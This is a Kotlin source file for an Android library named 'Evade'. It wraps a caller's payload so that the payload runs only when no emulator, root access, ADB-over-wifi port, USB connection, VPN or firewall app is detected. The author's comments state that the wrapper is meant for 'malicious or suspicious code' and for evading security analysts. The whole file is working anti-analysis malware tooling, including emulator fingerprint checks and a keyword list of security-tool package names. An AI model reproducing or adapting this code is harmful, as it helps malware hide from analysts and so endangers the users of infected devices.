/*Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.*/
package com.evilthreads.evade

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.hardware.usb.UsbManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.scottyab.rootbeer.RootBeer
import java.net.NetworkInterface
import javax.net.SocketFactory

/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class OnEvade{
    class Success(val result: Boolean): Result{
        fun onSuccess(callback: () -> Unit): Escape{
            if(this.result)
                callback()
            return Escape(this.result)
        }
    }
    class Escape(val result: Boolean): Result{
        fun onEscape(callback: () -> Unit): Success{
            if(!this.result)
                callback()
            return Success(this.result)
        }
    }
}

interface Result
/*This is a scoping functon for your payload. Write your malicious or suspicious code right here. The trailing lambda is then executed after we
check multiple conditions regarding whether it is safe in regards to cyber security analysts. If you do not require networking capabilities with
your payload please pass false as the argument as true is the default value. This will also return a callback for onEscape meaning it was not executed.
Which immediately after you can register for a callback named onSuccess.*/
//If we wanted to make this better we could check the state of the sim card(s) allowing us to evade device's without a sim card. However this will cause us to use a dangerous permission called READ_PHONE_STATE
fun Context.evade(requiresNetwork: Boolean = true, payload: () -> Unit): OnEvade.Escape{
    if(!isEmulator && !isRooted() && !hasAdbOverWifi() && !isConnected()){
        if(hasUsbDevices())
            return OnEvade.Escape(false)
        if(requiresNetwork){
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                if(hasVPN())
                    return OnEvade.Escape(false)
            if(Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
                if(hasFirewall())
                    return OnEvade.Escape(false)
        }
        payload()
        return OnEvade.Escape(true)
    }
    return OnEvade.Escape(false)
}

/*Checks whether this phone is connected to a usb device such as a computer. I do not know whether this works but I believe it won't hurt to check*/
@RequiresApi(Build.VERSION_CODES.HONEYCOMB_MR1)
private fun Context.hasUsbDevices() = (this.getSystemService(Context.USB_SERVICE) as UsbManager).deviceList.isNotEmpty()

/*Checks whether the app is running on a fake device*/
private val isEmulator = (Build.DEVICE.contains("generic")
        || Build.FINGERPRINT.contains("generic")
        || Build.MODEL.contains("google_sdk")
        || Build.MODEL.contains("Emulator")
        || Build.MODEL.contains("Android SDK built for x86")
        || Build.BOARD == "QC_Reference_Phone"
        || Build.MANUFACTURER.contains("Genymotion")
        || Build.HOST.startsWith("Build") //MSI App Player
        || (Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic"))
        || Build.HARDWARE.contains("goldfish")
        || Build.HARDWARE.contains("ranchu")
        || Build.PRODUCT.contains("sdk_google")
        || Build.PRODUCT.contains("google_sdk")
        || Build.PRODUCT.contains("full_x86")
        || Build.PRODUCT.contains("sdk")
        || Build.PRODUCT.contains("sdk_x86")
        || Build.PRODUCT.contains("vbox86p")
        || Build.PRODUCT.contains("emulator")
        || Build.PRODUCT.contains("simulator"))

/*checks whether the device has a firewall or networking utilities app installed.*/
private fun Context.hasFirewall(): Boolean {
    lateinit var packages: List<PackageInfo>
    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
        packages = this.packageManager.getInstalledPackages(PackageManager.MATCH_UNINSTALLED_PACKAGES)
    else
        packages = this.packageManager.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES)
    packages.forEach { app ->
        val name = app.packageName.toLowerCase()
        if (name.contains("firewall") || name.contains("adb")
            || name.contains("port scanner") || name.contains("network scanner")
            || name.contains("network analysis") || name.contains("ip tools")
            || name.contains("net scan") || name.contains("network analyzer"))
            return true
    }
    return false
}

/*Checks whether the device is listening to port 5555. This port is used to connect to a computer through wifi on a local network for ADB debugging*/
private fun Context.hasAdbOverWifi(): Boolean{
    var isOpen = false
    val mgr = this.getSystemService(Context.WIFI_SERVICE) as WifiManager
    if(!mgr.isWifiEnabled)
        return isOpen
    val job = Thread {
        NetworkInterface.getNetworkInterfaces().asSequence().forEach { networkInterface ->
            networkInterface.inetAddresses.asSequence().forEach { addresses ->
                if (addresses.isLoopbackAddress && addresses.toString().contains(".")) {
                    Log.d("EVADE", addresses.toString())
                    runCatching {
                        SocketFactory.getDefault().createSocket(addresses.hostAddress.toString().split("/")[1], 5555).close()
                        isOpen = true
                    }
                }
            }
        }
    }
    job.run()
    job.join()
    return isOpen
}

/*checks whether the network is running through a VPN*/
@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
private fun Context.hasVPN(): Boolean{
    val mgr = this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    mgr.allNetworks.forEach {network ->
        val capabilities = mgr.getNetworkCapabilities(network)
        if(capabilities!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
            return true
    }
    return false
}

/*checks whether the device has super user powers SU*/
private fun Context.isRooted() = RootBeer(this).apply { setLogging(false) }.isRooted

/*checks whether there is a usb cord plugged into the phone*/
private fun Context.isConnected(): Boolean {
    val intent = this.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
    val plugged = intent!!.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1)
        return plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB || plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS
    return plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB
}